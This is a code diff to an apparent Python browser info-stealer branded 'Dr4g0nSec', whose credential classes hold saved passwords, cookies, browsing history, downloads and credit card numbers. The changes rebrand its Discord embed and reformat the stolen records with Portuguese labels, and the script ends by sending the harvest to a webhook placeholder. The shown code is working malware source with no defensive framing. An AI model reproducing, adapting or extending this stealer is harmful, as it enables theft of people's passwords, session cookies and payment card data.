@@ -65,12 +65,12 @@ class Upload:
 
     def send(self):
         embed = Embed(
-            title="<:dr4g0n:1362932398102155475> Dr4g0nSec | Navegadores Info <:dr4g0n:1362932398102155475>",
+            title="<:conectados:1385867561589149748> Dr4g0nSec | Navegadores Info <:conectados:1385867561589149748>",
             description="```" + '\n'.join(self.tree(Path(self.temp_path))) + "```",
             color=0x250e80
         )
         embed.set_footer(
-            text="Created by sk4rty | https://github.com/sk4rtyxz",
+            text="Created by sk4rty | Dr4g0nSec on Top!",
             icon_url="https://i.pinimg.com/736x/b2/d6/d7/b2d6d766dfa4f99bb325ac908c7ed12d.jpg"
         )
 
@@ -161,7 +161,7 @@ class Chromium:
                     try:
                         operation(path, profile)
                     except Exception as e:
-                        # print(e)
+
                         pass
 
     def get_master_key(self, path: str) -> str:
@@ -316,7 +316,7 @@ class Types:
             self.password = password
 
         def __str__(self):
-            return f'{self.url}\t{self.username}\t{self.password}'
+            return f'Site: {self.url}\nUsuário: {self.username}\nSenha: {self.password}\n'
 
         def __repr__(self):
             return self.__str__()
@@ -330,7 +330,7 @@ class Types:
             self.expires = expires
 
         def __str__(self):
-            return f'{self.host}\t{"FALSE" if self.expires == 0 else "TRUE"}\t{self.path}\t{"FALSE" if self.host.startswith(".") else "TRUE"}\t{self.expires}\t{self.name}\t{self.value}'
+            return f'Host: {self.host}\nNome: {self.name}\nPath: {self.path}\nValor: {self.value}\nExpira: {self.expires}\n'
 
         def __repr__(self):
             return self.__str__()
@@ -342,7 +342,7 @@ class Types:
             self.timestamp = timestamp
 
         def __str__(self):
-            return f'{self.url}\t{self.title}\t{self.timestamp}'
+            return f'URL: {self.url}\nTítulo: {self.title}\nÚltimo Acesso: {self.timestamp}\n'
 
         def __repr__(self):
             return self.__str__()
@@ -353,7 +353,7 @@ class Types:
             self.target_path = target_path
 
         def __str__(self):
-            return f'{self.tab_url}\t{self.target_path}'
+            return f'Arquivo: {self.target_path}\nFonte: {self.tab_url}\n'
 
         def __repr__(self):
             return self.__str__()
@@ -367,10 +367,13 @@ class Types:
             self.date_modified = date_modified
 
         def __str__(self):
-            return f'{self.name}\t{self.month}\t{self.year}\t{self.number}\t{self.date_modified}'
+            return (f'Nome: {self.name}\nNúmero: {self.number}\n'
+                    f'Validade: {self.month}/{self.year}\n'
+                    f'Modificado: {self.date_modified}\n')
 
         def __repr__(self):
             return self.__str__()
+
         
 H00K3_URL = "%WEBHOOK%"
 Browsers(H00K3_URL)
